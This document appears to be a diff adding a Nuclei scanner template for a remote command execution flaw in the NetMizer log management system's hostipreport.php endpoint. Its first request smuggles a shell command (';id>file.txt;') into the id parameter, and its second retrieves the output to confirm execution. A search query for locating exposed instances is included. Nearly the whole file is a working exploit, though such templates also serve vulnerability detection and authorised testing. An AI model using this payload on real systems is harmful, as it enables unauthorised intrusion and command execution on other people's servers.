@@ -1,0 +1,37 @@
+id: netmizer-rzsj-hostipreport-rce
+
+info:
+  name: netmizer-rzsj-hostipreport-rce
+  author: HuanXiong
+  severity: high
+  description: netmizer-rzsj-hostipreport-rce
+  tags: netmizer, sqli
+  metadata:
+    fofa-query: title="NetMizer 日志管理系统"
+    verified: true
+    max-request: 2
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" # 从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        GET /data/yxproject/hostipreport.php?action=showtask&id=;id>{{username}}.txt; HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Connection: keep-alive
+        Accept-Encoding: gzip, deflate, br
+        
+      - |
+        GET /data/yxproject/{{username}}.txt HTTP/1.1
+        Host: 
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains_all(body, 'uid=')"
